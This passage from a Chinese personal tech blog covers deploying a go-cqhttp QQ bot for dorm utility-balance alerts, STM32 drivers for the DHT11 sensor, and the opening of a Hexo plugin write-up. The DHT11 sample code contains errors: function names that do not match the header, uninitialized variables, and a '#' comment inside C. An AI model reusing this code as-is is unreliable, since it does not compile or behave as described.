<ol>
<li>GET 请求获取水电费余额</li>
<li>计算余额是否不足</li>
<li>【可选】使用 hook 进行推送</li>
<li>发送消息至机器人</li>
<li>结束</li>
</ol>
<pre><code class="language-python">import json  
import requests  
  
QQ_GROUP_NUMBER = 123456 # QQ群号    
QQ_PUSH_URL = 'http://xxxx:5700/send_group_msg'
  
def send_message_qq(msg):
    pyload = {
        &quot;group_id&quot;: QQ_GROUP_NUMBER,
        &quot;message&quot;: msg
    }
    headers = {
        &quot;Content-Type&quot;: &quot;application/json; charset=UTF-8&quot;
    }
    requests.post(QQ_PUSH_URL, data=json.dumps(pyload), headers=headers)

def main():
	# 编写自己的逻辑 比如获取水电费
    send_message_qq(msg)  # Q群提示

if __name__ == '__main__':
    main()
</code></pre>
<h1>Linux 部署</h1>
<p>安装 go-cqhttp，解压压缩包。同理，改一下协议并先运行一下。<strong>此时并不能扫码登录 QQ，因为 QQ 判定你的登录地和扫码地太远。这时候我们只需要把之前的 <code>session.token</code> 文件复制到当前目录即可。</strong></p>
<p>运行 go-cqhttp。我们可以在本地浏览器等 HTTP 客户端进行测试：</p>
<pre><code class="language-url">http://&lt;服务器IP&gt;:5700/send_group_msg?group_id=&lt;QQ群群号&gt;&amp;message=hello_world
</code></pre>
<blockquote>
<p>云服务器安全组中记得把 5700 打开。</p>
</blockquote>
<p>测试无误后把 python 文件复制过来，记得改一下正确的 <code>QQ_PUSH_URL</code>，应改为 <code>http://127.0.0.1:5700/send_group_msg</code>。</p>
<p>后台运行 go-cqhttp（参考 <a href="#2445395019" title="Linux 使用 nohup 后台运行程序" class="record-link ">Linux 使用 nohup 后台运行程序</a>）：</p>
<pre><code class="language-sh"># 必须在go-cqhttp存在的目录运行指令
nohup /&lt;your_dir&gt;/go-cqhttp &amp;
</code></pre>
<p>然后将运行 python 脚本的任务添加到 crontab 中实现定时启动（参考：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link ">Linux 使用 Cron 创建定时任务</a>）</p>
<pre><code class="language-cron">4 8 * * * /usr/bin/python /&lt;your_dir&gt;/your.py 
</code></pre>
<blockquote>
<p>后续：偶然出现消息没有成功发送出去的情况，所以不要过度依赖。</p>
</blockquote>
<h1>后记</h1>
<p>如果想更方便更快捷实现更多丰富的功能（比如发图、群管理、群指令、游戏数据管理等），可以考虑使用各种语言的 SDK 进行进一步的开发：<a href="https://docs.go-cqhttp.org/guide/quick_start.html#%E5%B7%B2%E7%9F%A5%E7%9A%84-go-cqhttp-%E9%80%9A%E4%BF%A1-sdk">开始 | go-cqhttp 帮助中心</a></p>
<p>2024 年 7 月 27 日通过检查发现，从昨天（26 日）开始沈典巷的某公寓的水电费的接口升级了，似乎加入了认证机制，不能通过脚本查看具体水电费余额，手机上也不能查看其他宿舍的余额了。机器人倒是没挂。</p>
<p>第二天找到了通知原文：</p>
<blockquote>
<p>[!cite] 关于「XX 通」水电小程序升级的通知<br>
各公寓区住户您好：为尽量避免公寓住户在「XX 通」水电充值过程中的误充情况，现对「XX 通」水电充值程序优化升级。计划更新时间：2024 年 7 月 26 日 10 时。主要更新内容：1、进入水电小程序后，系统将默认选择本人所登记房间；2、非本人所登记房间余额将不显示，请注意区分；3、如需向非本人房间充值，可以手动选择房间号后充值。注意事项：如同学发现「XX 通」系统显示的房间号和本人入住房间有偏差，可至各公寓区一站式服务中心处理（如存在私下调宿情况，公寓区一站式服务中心不予处理）。</p>
</blockquote>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/read/cv7009209/">我与酷Q的故事——纪念QQ机器人业黑暗的一天 - 哔哩哔哩 (bilibili.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/166310645">酷Q停运后，其他机器人，该何去何从？ - 知乎 (zhihu.com)</a></li>
<li><a href="https://onebot.dev/introduction.html">介绍 | OneBot</a></li>
<li><a href="https://www.zhihu.com/question/610131308">腾讯 QQ Windows 全新 NT 架构 9.9.0 体验版上架官网，升级后有哪些亮点？ - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/zoey_peak/article/details/130610547">【个人笔记】go-cqhttp+pycqBot配置-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/apple_51931783/article/details/128421324">初识Nonebot2-CSDN博客</a></li>
<li><a href="https://juejin.cn/post/7229314169647726629">Linux 安装配置 go-cqhttp - 掘金 (juejin.cn)</a></li>
<li><a href="https://blog.csdn.net/hanhx1993/article/details/89668170">listen tcp :8080: bind: Only one usage of each socket address (protocol/network address/port) is nor-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/Amiao_173/article/details/128559937">解决Go-CQhttp无法登录（服务器如何登录）的问题_go-cqhttp登录失败-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_39247153/article/details/81984524">使用python解析Json字符串-获取Json字符串关键字_python解析json获取key字段名-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/629006773">Python爬虫基础（3）——requests库get请求方法 - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1464127505">
                            <a href="#1464127505">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>对电脑端微信小程序抓包</span>
                                
                                <div class="record-links-context hover">
                                    <p>在 <a href="#1464127505" title="对电脑端微信小程序抓包" class="record-link highlight">之前的文章</a> 中提到，我需要每天查询宿舍水电费余额。抓到小程序查余额的接口后，我打算把消息通知到宿舍 QQ 群中（微信群机器人操作太麻烦，或者说只有企业群才有机器人）。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2287168649">
                            <a href="#2287168649">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 使用 Cron 创建定时任务</span>
                                
                                <div class="record-links-context hover">
                                    <p>然后将运行 python 脚本的任务添加到 crontab 中实现定时启动（参考：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link highlight">Linux 使用 Cron 创建定时任务</a>）</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2445395019">
                            <a href="#2445395019">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 使用 nohup 后台运行程序</span>
                                
                                <div class="record-links-context hover">
                                    <p>后台运行 go-cqhttp（参考 <a href="#2445395019" title="Linux 使用 nohup 后台运行程序" class="record-link highlight">Linux 使用 nohup 后台运行程序</a>）：</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3118126311">
                            <a href="#3118126311">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>利用 Cron 编写简单的定时脚本（含简易的 CDN 攻击预警）</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#888931094" title="go-cqhttp 部署与简单编程" class="record-link highlight">go-cqhttp 部署与简单编程</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3298282303" class="record">
            <header>
                <h1 class="record-title">DHT11 驱动程序</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('DHT11');">DHT11</button>
                    
                    <button class="btn" onclick="activeTag('驱动');">驱动</button>
                    
                    <button class="btn" onclick="activeTag('STM32');">STM32</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('HAL');">HAL</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/23/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404231344.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>给出标准库及 HAL 驱动示例。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>c497cb3f</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>DHT11 简介</h1>
<p>DHT11 数字温湿度传感器是一款含有已校准数字信号输出的温湿度复合传感器。DHT11 有 3 脚和 4 脚两款，在使用上没有差别，接线都一样，主要接三根，四脚的款式有一脚悬空。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240404222618.webp" alt="img|350"></p>
<p>典型接线线路如下图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240423202538.webp" alt="image.png|475"></p>
<p>引脚：</p>
<table>
<thead>
<tr>
<th>Pin</th>
<th>名称</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>VDD</td>
<td>供电 3-5.5V</td>
</tr>
<tr>
<td>2</td>
<td>GND</td>
<td>接地，电源负极</td>
</tr>
<tr>
<td>3</td>
<td>DATA</td>
<td>串行数据，单总线</td>
</tr>
<tr>
<td>4</td>
<td>NC</td>
<td>空脚，请悬空</td>
</tr>
</tbody>
</table>
<p>DHT11 采样频率为 1HZ，建议平均 1~2s 读取一次数据。</p>
<h1>单总线协议</h1>
<p>DHT11 采用单总线协议与单片机通信，也就是使用一根 DATA 线进行数据的收发。单片机发送一次复位信号后，DHT11 从低功耗模式转换到高速模式，等待主机复位结束后，DHT11 发送响应信号，并拉高总线准备传输数据。</p>
<p>数据格式（共 40bit）：</p>
<ol>
<li>8bit 湿度整数数据</li>
<li>8bit 湿度小数数据</li>
<li>8bit 温度整数数据</li>
<li>8bit 温度小数数据</li>
<li>8bit 校验和</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240430173533.webp" alt="image.png"></p>
<p>DHT11 的 DATA 传输一次完整的数据为 40bit，按照高位在前，低位在后的顺序传输。</p>
<p>DHT11 只有在接收到开始信号后才触发一次温湿度采集，如果没有接收到主机发送复位信号，DHT11 不主动进行温湿度采集。当数据采集完毕且无开始信号后，DHT11 自动切换到低速模式。</p>
<h2>初始化</h2>
<pre><code class="language-plantuml">@startuml
binary &quot;Level&quot; as L
concise &quot;状态&quot; as S
scale 100 as 150 pixels
@0
L is low
S is 复位

@+48
L is high
L@0 &lt;-&gt; @48: 18ms


@+30
L is low
S is DHT响应信号
L@48 &lt;-&gt; @78: 20-40us

@+80
L is high

L@78 &lt;-&gt; @158: 80us

@+80
L is low
S is DHT传输数据
L@158 &lt;-&gt; @238: 80us

highlight 0 to 78 #b4d9ff;line:DimGrey : 主机
highlight 348 to 400 #b4d9ff;line:DimGrey : 主机
@+10
L is {low,high}
@+50
L is low
S is DHT拉低
@+50
L is high
S is 主机控制
L@298 &lt;-&gt; @348: 50us

@enduml
</code></pre>
<p>DHT11 初始化过程分为：</p>
<ul>
<li>主机发送复位信号：首先主机拉低总线至少 <strong>18ms</strong>，然后再拉高总线，延时 20~40us，取中间值 30us，此时复位信号发送完毕。</li>
<li>DHT11 发送响应信号：DHT11 检测到复位信号后，触发一次采样，并拉低总线 80us 表示响应信号，告诉主机数据已经准备好了；然后 DHT11 拉高总线 80us，之后开始传输数据。</li>
</ul>
<blockquote>
<p>注意，主机一开始拉低总线是 18 <strong>毫秒</strong>，不是 18 微秒。</p>
</blockquote>
<p>从模式下，DHT11 接收到开始信号触发一次温湿度采集，如果没有接收到主机发送开始信号，DHT11 不会主动进行温湿度采集。采集数据后转换到低速模式。</p>
<p>实际上 DHT11 的响应时间并不是标准的 80us，往往存在误差，当响应时间处于 20~100us 之间时就可以认定响应成功。</p>
<h2>DHT11 传输数据</h2>
<p>DHT11 在拉高总线 80us 后开始传输数据。每 1bit 数据都以 50us 低电平时隙开始，告诉主机开始传输一位数据了。DHT11 以高电平的长短定义数据位是 0 还是 1，当 50us 低电平时隙过后拉高总线，高电平持续 26~28us 表示数据“0”；持续 70us 表示数据“1”。</p>
<pre><code class="language-plantuml">@startuml
binary &quot;数据0&quot; as Z
binary &quot;数据1&quot; as O
scale 100 as 180 pixels
@0
Z is low
O is low

@+50
Z is high
O is high
Z@0 &lt;-&gt; @50: 50us时隙
O@0 &lt;-&gt; @50: 50us时隙

@50
Z is high
O is high

@77
Z is low
Z@50 &lt;-&gt; @77: 26-28us
Z@77 &lt;-&gt; @250: 下一bit
@120
O is low
O@50 &lt;-&gt; @120: 70us
O@120 &lt;-&gt; @250: 下一bit

@127
Z is {low,high}

@170

O is {low,high}

@250

Z is low
O is low

@enduml
</code></pre>
<p>当 最后 1bit 数据传送完毕后，DHT11 拉低总线 50us，表示数据传输完毕，随后总线由上拉电阻拉高进入空闲状态。</p>
<p>区分 0 和 1 的方法：当数据位之前的 50us 低电平时隙过后，总线肯定会拉高，此时延时 40us 后检测总线状态，如果为高，说明此时处于 70us 的时隙，则数据为“1”；如果为低，说明此时处于下一位数据 50us 的开始时隙，那么上一位数据肯定是“0”。</p>
<h1>驱动实现</h1>
<h2>标准库</h2>
<pre><code class="language-c">#ifndef _DHT11_H
#define _DHT11_H
#include &quot;stm32f10x.h&quot;                  // Device header

void DHT11_GPIO_Init_OUT(void);
void DHT11_GPIO_Init_IN(void);
void DHT11_Start(void);
unsigned char DHT11_REC_Byte(void);
void DHT11_REC_Data(void);

#endif

</code></pre>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header
#include  &quot;dht11.h&quot;
#include  &quot;SysTick.h&quot;           // 延时函数
//数据
unsigned int rec_data[4];

// GPIOB
#define DHT11_GPIO_Pin_x GPIO_Pin_11

#define dht11_high GPIO_SetBits(GPIOB, DHT11_GPIO_Pin_x)
#define dht11_low GPIO_ResetBits(GPIOB, DHT11_GPIO_Pin_x)
#define Read_Data GPIO_ReadInputDataBit(GPIOB, DHT11_GPIO_Pin_x)

//对于stm32来说，是输出
void DH11_GPIO_Init_OUT(void)
{
	GPIO_InitTypeDef GPIO_InitStructure;
	
	RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE);
	
	GPIO_InitStructure.GPIO_Mode  = GPIO_Mode_Out_PP; //推挽输出
	GPIO_InitStructure.GPIO_Pin   = DHT11_GPIO_Pin_x;
	GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
	
	GPIO_Init(GPIOB, &amp;GPIO_InitStructure);

}

//对于stm32来说，是输入
void DH11_GPIO_Init_IN(void)
{
	GPIO_InitTypeDef GPIO_InitStructure;
	
	RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE);
	
	GPIO_InitStructure.GPIO_Mode  = GPIO_Mode_IN_FLOATING; //浮空输入
	GPIO_InitStructure.GPIO_Pin   = DHT11_GPIO_Pin_x;
	GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
	
	GPIO_Init(GPIOB, &amp;GPIO_InitStructure);

}

//主机发送开始信号
void DHT11_Start(void)
{
	DH11_GPIO_Init_OUT(); //输出模式
	
	dht11_high; //先拉高
	Delay_us(30);
	
	dht11_low; //拉低电平至少18us
	Delay_ms(20); // ms 没错
	
	dht11_high; //拉高电平20~40us
	Delay_us(30);
	
	DH11_GPIO_Init_IN(); //输入模式
}

//获取一个字节
char DHT11_Rec_Byte(void)
{
	unsigned char i = 0;
	unsigned char data;
	
	for(i=0;i&lt;8;i++) //1个数据就是1个字节byte，1个字节byte有8位bit
	{
		while( Read_Data == 0); //从1bit开始，低电平变高电平，等待低电平结束
		Delay_us(30); //延迟30us是为了区别数据0和数据1，0只有26~28us
		
		data &lt;&lt;= 1; //左移
		
		if( Read_Data == 1 ) //如果过了30us还是高电平的话就是数据1
		{
			data |= 1; //数据+1
		}
		
		while( Read_Data == 1 ); //高电平变低电平，等待高电平结束
	}
	
	return data;
}

//获取数据

void DHT11_REC_Data(void)
{
	unsigned int R_H,R_L,T_H,T_L;
	unsigned char RH,RL,TH,TL,CHECK;
	
	DHT11_Start(); //主机发送信号
	dht11_high; //拉高电平
	
	if( Read_Data == 0 ) //判断DHT11是否响应
	{
		while( Read_Data == 0); //低电平变高电平，等待低电平结束
		while( Read_Data == 1); //高电平变低电平，等待高电平结束
		
		R_H = DHT11_Rec_Byte();
		R_L = DHT11_Rec_Byte();
		T_H = DHT11_Rec_Byte();
		T_L = DHT11_Rec_Byte();
		CHECK = DHT11_Rec_Byte(); //接收5个数据
		
		dht11_low; //当最后一bit数据传送完毕后，DHT11拉低总线 50us
		Delay_us(55); //这里延时55us
		dht11_high; //随后总线由上拉电阻拉高进入空闲状态。
		
		if(R_H + R_L + T_H + T_L == CHECK) //和检验位对比，判断校验接收到的数据是否正确
		{
			RH = R_H;
			RL = R_L;
			TH = T_H;
			TL = T_L;
		}
	}
	rec_data[0] = RH;
	rec_data[1] = RL;
	rec_data[2] = TH;
	rec_data[3] = TL;
}


</code></pre>
<pre><code class="language-c">#include &quot;dht11.h&quot;
extern unsigned int rec_data[4]; // 直接使用里面的数据
int main_task(void)
{
    while(1)
    {
		// 直接使用rec_data里面的数据。注意间隔一定时间再读取，以免错误。
    }
}
</code></pre>
<h2>HAL</h2>
<p>DHT11 对时序要求严格，需要微妙级延时，我们常用的 HAL_Delay 是毫秒级时延。由于 FreeRTOS 是不支持微秒级延时的，需要自己定义微秒级别的延时函数（详见：<a href="#3318795350" title="STM32 延时函数（FreeRTOS）" class="record-link ">STM32 延时函数（FreeRTOS）</a>。</p>
<pre><code class="language-c">#ifndef __dht11_h
#define __dht11_h

extern uint8_t temperature;         
extern uint8_t humidity; 

void DHT11_REST(void);                            //复位DHT11
uint8_t DHT11_Check(void);                       //DHT11状态反馈
uint8_t DHT11_Read_Bit(void);                    //读DHT11一位数据
uint8_t DHT11_Read_Byte(void);                   //读DHT11一字节数据
uint8_t DHT11_Read_Data(uint8_t* humi,uint8_t* temp);     //DHT11数据显示

#endif /*__dht11_h*/

</code></pre>
<pre><code class="language-c">
#include &quot;stm32f1xx_hal.h&quot;
#include &quot;delay.h&quot; # us级延时函数

#define DHT11_GPIOx		GPIOB
#define DHT11_GPIO_PIN	GPIO_PIN_11

uint8_t temperature;      //给一个初始化,用以判断               
uint8_t humidity; 

void DHT11_OUT(void )//输出引脚
{
	GPIO_InitTypeDef GPIO_InitStruct;
	GPIO_InitStruct.Pin = DHT11_GPIO_PIN;
	GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
	GPIO_InitStruct.Pull = GPIO_PULLUP;
	GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
	HAL_GPIO_Init(DHT11_GPIOx, &amp;GPIO_InitStruct);
}
void DHT11_IN(void )//输入引脚
{
	GPIO_InitTypeDef GPIO_InitStruct;
	GPIO_InitStruct.Pin = DHT11_GPIO_PIN;
	GPIO_InitStruct.Mode = GPIO_MODE_INPUT ;
	GPIO_InitStruct.Pull = GPIO_PULLUP;
	GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
	HAL_GPIO_Init(DHT11_GPIOx, &amp;GPIO_InitStruct);
}

void DHT11_REST(void ) //主机发出起始信号
{
	DHT11_OUT();
	HAL_GPIO_WritePin (DHT11_GPIOx ,DHT11_GPIO_PIN ,GPIO_PIN_RESET );
	HAL_Delay (20); // ms
	HAL_GPIO_WritePin (DHT11_GPIOx ,DHT11_GPIO_PIN ,GPIO_PIN_SET );
	delay_us (30);
}

//gpio端口为输入模式时,配置为上拉输入或者浮空输入,因外接上拉电阻,默认为高电平
//当有负信号输入时,gpio端口为1.
//若有负信号输入，当信号引脚连接到GND或者其他低电平信号时，GPIO端口会检测到低电平并显示为0。
//这是因为负信号的优先级高于上拉电阻的电平设置。


uint8_t DHT11_Check(void)
{
    uint8_t retry = 0;

    DHT11_IN();  // 设置数据引脚为输入模式

    while (HAL_GPIO_ReadPin(DHT11_GPIOx, DHT11_GPIO_PIN) == 1 &amp;&amp; retry &lt; 80)
    {
        retry++;
        delay_us(1);  // 延迟1微秒
    }

    if (retry &gt;= 80)
        return 1;  // 如果在规定时间内引脚仍为高电平，表示传感器未响应，返回错误代码 1
    else
        retry = 0;

    while (HAL_GPIO_ReadPin(DHT11_GPIOx, DHT11_GPIO_PIN) == 0 &amp;&amp; retry &lt; 80)
    {
        retry++;
        delay_us(1);  // 延迟1微秒
    }

    if (retry &gt;= 80)
        return 1;  // 如果在规定时间内引脚仍为低电平，表示传感器未响应，返回错误代码 1

    return 0;  // 传感器响应正常，返回成功代码 0
}
//读取一个位,参考高低电平的时序
uint8_t DHT11_Read_Bit(void)
{
	uint8_t retry=0;
	while((HAL_GPIO_ReadPin (DHT11_GPIOx ,DHT11_GPIO_PIN)==1) &amp;&amp; (retry &lt;100))
	{
		retry ++;
		delay_us (1);
	}
	retry=0;
	while((HAL_GPIO_ReadPin(DHT11_GPIOx ,DHT11_GPIO_PIN)==0) &amp;&amp; (retry &lt;100))
	{
		retry ++;
		delay_us (1);
	}
	delay_us (40);
	if(HAL_GPIO_ReadPin (DHT11_GPIOx ,DHT11_GPIO_PIN )==1)
		return 1;// 返回读取到的位为高电平
	else 
		return 0;// 返回读取到的位为低电平
}

//读取一个字节,接收数据
uint8_t DHT11_Read_Byte(void)
{
	uint8_t dat=0;
	for(uint8_t i=0;i&lt;8;i++)
	{
		dat &lt;&lt;= 1;
		dat |= DHT11_Read_Bit();
	}
	return dat;

}
//更据上面的数据格式,解码数据
uint8_t DHT11_Read_Data(uint8_t* humi, uint8_t* temp)
{
    uint8_t buf[5];  // 存储读取到的5个字节数据的缓冲区

    DHT11_REST();  // 初始化传感器通信

    if (DHT11_Check() == 0)  // 检查传感器是否正常响应
    {
        for (uint8_t i = 0; i &lt; 5; i++)
            buf[i] = DHT11_Read_Byte();  // 逐个字节读取传感器发送的数据

        if ((buf[0] + buf[1] + buf[2] + buf[3]) == buf[4])  // 校验数据的准确性
        {
            *humi = buf[0];  // 将湿度值存储到指定的变量中
            *temp = buf[2];  // 将温度值存储到指定的变量中
        }
    }
    else
    {
        return 1;  // 传感器响应异常，返回错误代码
    }

    return 0;  // 读取数据成功，返回正常代码
}



</code></pre>
<pre><code class="language-c">#include &quot;dht11.h&quot;

int main_task(void)
{
	DHT11_REST();                 //复位DHT11
	while(DHT11_Check())                           //检测DHT11连接
	{
	  OLED_ShowString(1,1,&quot;DHT11 No Connect!&quot;);
	  HAL_Delay(500);
	}
    while(1)
    {
		DHT11_Read_Data(&amp;humidity,&amp;temperature);
		// 使用temperature和humidity
    }
}
</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/m0_55849362/article/details/126426768">DHT11详细介绍（内含51和STM32代码）-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/671411357">手把手教你玩转DHT11（原理+驱动） - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/m0_69414528/article/details/133927246">【STM32(HAL库)--DHT11温湿度传感器】_使用hal库对dht11进行采集-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3318795350">
                            <a href="#3318795350">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 延时函数（FreeRTOS）</span>
                                
                                <div class="record-links-context hover">
                                    <p>DHT11 对时序要求严格，需要微妙级延时，我们常用的 HAL_Delay 是毫秒级时延。由于 FreeRTOS 是不支持微秒级延时的，需要自己定义微秒级别的延时函数（详见：<a href="#3318795350" title="STM32 延时函数（FreeRTOS）" class="record-link highlight">STM32 延时函数（FreeRTOS）</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link ">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link highlight">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link ">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="746142122" class="record">
            <header>
                <h1 class="record-title">第一次写 Hexo 插件</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Hexo');">Hexo</button>
                    
                    <button class="btn" onclick="activeTag('npm');">npm</button>
                    
                    <button class="btn" onclick="activeTag('开发杂记');">开发杂记</button>
                    
                    <button class="btn" onclick="activeTag('Obsidian');">Obsidian</button>
                    
                    <button class="btn" onclick="activeTag('正则表达式');">正则表达式</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/29/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/RTFM_header_2cover.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>一个历时半年的任务，一个晚上解决</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>2c7939aa</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>顽疾</h1>
<p>自从引入 Obsidian 管理 Hexo 博客之后，一个重要的问题需要解决：如何完美将 Obsidian 特性迁移到 Hexo 中，实现「所见即所得」。这里的「见」指的就是本地 Obsidian 渲染样式，「得」指的就是 Hexo 网页渲染样式。</p>
<p>Obsidian 引入了一些自己独有的 Markdown 语法与工作方式，我也为此不断探索最适合的渲染方案与使用习惯。在这个过程中，我成功总结出一套自己的经验：</p>
<ul>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></li>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
</ul>
<p>双链语法是 Obsidian 最重要的特性。一开始，我也找到了相似的插件 <code>hexo-link-obsidian</code>，但是这个插件的使用过为复杂和苛刻（详看 <a href="#2136059777" title="Obsidian Internal links 双向链接渲染解决方案" class="record-link ">这篇文章</a>）：</p>
<ol>
<li>首先，你必须安装 <code>hexo-abbrlink</code> 插件来为文章生成永久链接</li>
<li>其次，你必须在 Obsidian 安装 <code>link-info-server</code>（作者也是 <code>hexo-link-obsidian</code> 插件的作者），这个软件为 <code>hexo-link-obsidian</code> 提供服务。</li>
<li>最后，才在 hexo 安装 <code>hexo-link-obsidian</code>。</li>
<li>由于 <code>hexo-link-obsidian</code> 使用 <code>link-info-server</code> 服务，使用插件前必须保证 Obsidian 打开，否则插件失效。为此，我又为 Hexo 写了个预处理脚本，检测 <code>hexo-abbrlink</code> 的安装、监测 Obsidian 启动以及服务端口。</li>
</ol>
<p>这几个乱七八糟的插件强耦合，缝缝补补也能算凑合着用。但各种小问题也接踵而来。</p>
<p>一开始发现对原本笔记就有的网络图片渲染得不是很好，我就自己改了一下源代码，把插件 <code>index.js</code> 匹配图片的正则表达式改成一个永远不会有的值。</p>
<pre><code class="language-js">let pattern = /thestringyouwouldnerverwritekk24oo9669/g
</code></pre>
<p>结果当我把我这个解决方案写进文章时，把改的地方直接复制到 Markdown 文章里来，结果 pattern 就匹配上了......（其实是自己🦈🐝了）</p>
<p>另一个小插曲就是 <code>hexo-link-obsidian</code> 插件对 webp 图片格式没有支持，我就直接向它的仓库提交一个拉取请求，结果就通过了。我也算投机取巧成为一个小小贡献者......</p>
<p>这套工作方式安全用了半年。直到有一天，它又抽风了：在连接 <code>link-info-server</code> 插件出现了超时错误，问题难以排查。这个事件成了导火索，我不能再忍了🤬，再忙也得把它弄出来。</p>
<h1>一个晚上的奇迹</h1>
<p>我原本的思路是：</p>
<ol>
